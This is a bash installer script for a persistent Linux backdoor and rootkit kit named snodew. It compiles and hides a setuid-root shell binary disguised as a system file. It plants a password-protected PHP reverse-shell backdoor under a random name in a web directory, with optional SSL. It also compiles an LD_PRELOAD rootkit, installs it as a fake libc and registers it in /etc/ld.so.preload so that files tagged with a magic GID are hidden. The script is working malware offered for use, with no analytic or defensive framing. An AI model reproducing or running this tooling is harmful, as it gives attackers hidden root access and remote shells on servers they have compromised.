#!/bin/bash

# change this if you need to.
WWWNAME="www-data"
#WWWNAME="http"
#WWWNAME="httpd"

SECRET_PORT="" # if this is empty a random value is used instead

# by default use socat.ssl.php. change if you want.
# if using socat.ssl.php, you need to use src/ssl/gencert.sh first.
SNODEW_LOC="src/snodew.socat.ssl.php"
#SNODEW_LOC="src/snodew.socat.php"
#SNODEW_LOC="src/snodew.ncat.php"

MSGPATH="src/.interactive_shellmsg" # the contents of this file are shown to you
                                    # upon successfully receiving your reverse shell
                                    # (only works if it's an interactive shell)

tty -s && clear
[ -f .ascii ] && printf "\e[32m`cat .ascii`\e[0m" && echo

secho(){ echo -e " [\e[32m+\e[0m] $1"; }
eecho(){ echo -e " [\e[31m-\e[0m] $1"; }

[[ "$SNODEW_LOC" == *"socat"* ]] && [ ! -f `which socat 2>/dev/null || echo 'nope'` ] && { \
    eecho "you want to use socat for the reverse shell, but it's not installed."; \
    eecho "install it, or use snodew.ncat.php instead"; \
    exit; \
}

# if the user is using the ssl variant of the php scripts,
# we need to check they've generated a certificate first.
if [[ "$SNODEW_LOC" == *"ssl"* ]]; then
    [ ! -f `which openssl 2>/dev/null || echo 'nope'` ] && { \
        eecho "install openssl for $SNODEW_LOC"; \
        exit; \
    }

    CLIENTPEM="./src/ssl/client.pem"
    [ ! -f $CLIENTPEM ] && { eecho "$CLIENTPEM doesn't exist. have you used ./src/ssl/gencert.sh?"; exit; }
    SERVERCRT="./src/ssl/server.crt"
    [ ! -f $SERVERCRT ] && { eecho "$SERVERCRT doesn't exist. have you used ./src/ssl/gencert.sh?"; exit; }

    DO_SSL=1 # everything is present, tell setup.sh to setup everything with ssl in mind
fi

[ -z $COMPILE_ONLY ] && [ `id -u` != 0 ] && { eecho "not root, exiting"; exit; }
[ ! -f "$SNODEW_LOC" ] && { eecho "$SNODEW_LOC not found, exiting"; exit; }
[ ! -f `which gcc 2>/dev/null || echo 'nope'` ] && { eecho "gcc not installed/found, exiting"; exit; }
[ -z $NO_ROOTKIT ] && [ -z "`cat /etc/passwd | grep $WWWNAME`" ] && { \
    eecho "no passwd entry for $WWWNAME"; \
    exit; \
}
usage(){ echo " usage: $0 [install dir] [password]"; exit; }
# usage: show_info [install dir] [suid bin location] [magic gid] [secret port]
show_info(){
    echo -e " [..] installation directory: \e[32m$1\e[0m"
    echo -e " [..] suid bin location: $2"
    echo -e " [..] magic gid: $3"
    echo -e " [..] secret port: \e[32m$4\e[0m"
}
random(){ echo -n "`cat /dev/urandom | tr -dc $1 | fold -w $2 | head -n 1`"; }
# usage: hash_password [password]
hash_password(){ echo -n "$(sed 's/.\{2\}$//' <<< $(echo `echo -n "$1" | md5sum`))"; }
# usage: hide_file [path]
hide_file(){
    [ -z $NO_ROOTKIT ] && chown 0:$MAGIC_GID $1 2>/dev/null
}

get_userinfo(){ # $1 = username
    echo " [..] getting $1's information"
    WWWUID="`cat /etc/passwd | grep "$1" | awk -F: '{print $3}'`"
    WWWGID="`cat /etc/passwd | grep "$1" | awk -F: '{print $4}'`"
    WWWHOME="`cat /etc/passwd | grep "$1" | awk -F: '{print $6}'`"
}

# usage: setup_backdoor [suid bin location]
# compiles small program that runs /bin/sh after setting our gid to our magic gid.
# then hides it & gives it suid permissions.
setup_backdoor(){
    echo " [..] setting up suid binary for backdoor privesc"
    # setup welcome for backdoor
    NEW_MSGPATH="/etc/motd" #lol
    [ -z $COMPILE_ONLY ] && NEW_MSGPATH="/etc/`random 'a-z' 6`"
    [ -z $COMPILE_ONLY ] && { cp $MSGPATH $NEW_MSGPATH && hide_file $NEW_MSGPATH; }

    local output="$1"
    [ ! -z $COMPILE_ONLY ] && output="./bd"
    printf "#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0);setgid($MAGIC_GID);system(\"cat $NEW_MSGPATH 2>/dev/null; id\");execl(\"/bin/bash\",\"bash\",\"-li\",0);return 0;}" > bd.c

    echo " [..] compiling"
    gcc bd.c -o $output
    [ -z $COMPILE_ONLY ] && rm bd.c

    [ -z $NO_ROOTKIT ] && echo " [..] hiding"
    hide_file $output

    [ `id -u` == 0 ] && echo " [..] assigning suid bit"
    [ `id -u` == 0 ] && { chmod u+s $output || { eecho "couldn't assign suid bit to $output"; exit; }; }
    secho "finished setting up suid binary"
}

# usage:
# config_snodew [hashed password] [suid bin location] [install dir]
config_snodew(){
    echo " [..] configuring snodew"
    cp $SNODEW_LOC ${SNODEW_LOC}.bak
    sed -i "s:_PASS_:$1:" $SNODEW_LOC
    sed -i "s:_SUID_BIN_:$2:" $SNODEW_LOC
    sed -i "s:_MAGIC_VAR_:$MAGIC_VAR:" $SNODEW_LOC
    sed -i "s:_SECRET_PORT_:$SECRET_PORT:" $SNODEW_LOC

    if [ ! -z $DO_SSL ]; then   # first, copy cert somewhere & hide it
        echo " [..] setting up ssl cert for the backdoor"

        NCLIENTPEM="/etc/`random 'a-z' 6`.pem"
        NSERVERCRT="/etc/`random 'a-z' 6`.crt"

        [ -z $COMPILE_ONLY ] && cp $CLIENTPEM $NCLIENTPEM
        [ -z $COMPILE_ONLY ] && cp $SERVERCRT $NSERVERCRT
        hide_file $NCLIENTPEM
        hide_file $NSERVERCRT

        echo " [..] writing new cert paths to $SNODEW_LOC"
        sed -i "s:_SERVERCRTPATH_:$NSERVERCRT:" $SNODEW_LOC
        sed -i "s:_CLIENTPEMPATH_:$NCLIENTPEM:" $SNODEW_LOC
        secho "done configuring ssl settings"
    fi

    PHP_NEWFILENAME="`random 'a-z' 6`.php"
    PHP_LOCATION="$3/$PHP_NEWFILENAME"
    [ -z $COMPILE_ONLY ] && echo " [..] moving php script"
    [ -z $COMPILE_ONLY ] && mv $SNODEW_LOC $PHP_LOCATION
    mv ${SNODEW_LOC}.bak $SNODEW_LOC
    hide_file $PHP_LOCATION

    secho "backdoor path: \e[32m$PHP_LOCATION\e[0m"
}

[ -z "$1" ] && usage; # install dir
[ -z "$2" ] && usage; # password
[ ! -d "$1" ] && { eecho "specified install directory doesn't exist"; exit; }

[ -z $SECRET_PORT ] && SECRET_PORT=`random '1-9' 4`

INSTALL_DIR="$1"
PASS="$(hash_password $2)"
SUID_BIN="/lib/init.`random '1-4' 1`"
MAGIC_GID=`random '1-9' 3`
MAGIC_VAR="`random 'A-Z' 7`"
show_info $INSTALL_DIR $SUID_BIN $MAGIC_GID $SECRET_PORT; echo

setup_backdoor $SUID_BIN
echo; config_snodew $PASS $SUID_BIN $INSTALL_DIR

echo
[ ! -z $COMPILE_ONLY ] && secho "completed setting up snodew php backdoor"
[ ! -z $NO_ROOTKIT ] && exit  # IF THEY DON'T WANT ROOTKIT POWERS, END NOW!!11!


# SETUP ROOTKIT CONFIGURATION

echo " [..] configuring rootkit settings..."

CONF_H="src/config.h"     # copy file. keep original format.
cp $CONF_H ${CONF_H}.bak

SOPATH="/lib/libc.so.`random '1-9' 2`"
PRELOAD="/etc/ld.so.preload"
printf " [..] magic variable: \e[32m$MAGIC_VAR\e[0m\n"
sed -i "s:_MAGIC_GID_:$MAGIC_GID:" $CONF_H
sed -i "s:_MAGIC_VAR_:$MAGIC_VAR:" $CONF_H
sed -i "s:_SUID_BIN_:$SUID_BIN:" $CONF_H
sed -i "s:_SECRET_PORT_:$SECRET_PORT:" $CONF_H
sed -i "s:_PHP_LOCATION_:$PHP_LOCATION:" $CONF_H
sed -i "s:_PHP_NEWFILENAME_:$PHP_NEWFILENAME:" $CONF_H
sed -i "s:_MSGPATH_:$NEW_MSGPATH:" $CONF_H
sed -i "s:_SOPATH_:$SOPATH:" $CONF_H
sed -i "s:_PRELOAD_:$PRELOAD:" $CONF_H

# write service user information
get_userinfo $WWWNAME
sed -i "s:_WWWUID_:$WWWUID:" $CONF_H
sed -i "s:_WWWGID_:$WWWGID:" $CONF_H
sed -i "s:_WWWNAME_:$WWWNAME:" $CONF_H
sed -i "s:_WWWHOME_:$WWWHOME:" $CONF_H

if [ ! -z $DO_SSL ]; then
    echo " [..] writing ssl cert paths to rootkit header file"
    echo "#define CLIENTPEM \"$NCLIENTPEM\"" >> $CONF_H
    echo "#define SERVERCRT \"$NSERVERCRT\"" >> $CONF_H
fi

echo " [..] compiling snodew's rootkit"

gcc -std=gnu99 -O0 -g0 src/snodew2.c -Wall -fomit-frame-pointer -fPIC -shared -ldl -Wl,--build-id=none -o snodew2.so
rm $CONF_H && mv ${CONF_H}.bak $CONF_H
strip snodew2.so 2>/dev/null || { echo "couldn't strip snodew2.so, exiting"; exit; }
secho "compiled rootkit (snodew2.so - `ls -lhN snodew2.so | awk '{print $5}'`)"

[ ! -z $COMPILE_ONLY ] && exit


# INSTALL!

echo " [..] installing to $SOPATH and writing to $PRELOAD"
mv snodew2.so $SOPATH && hide_file $SOPATH
echo -n "$SOPATH" > $PRELOAD
hide_file $PRELOAD

secho "rootkit installation successful"
secho "restart the service now"
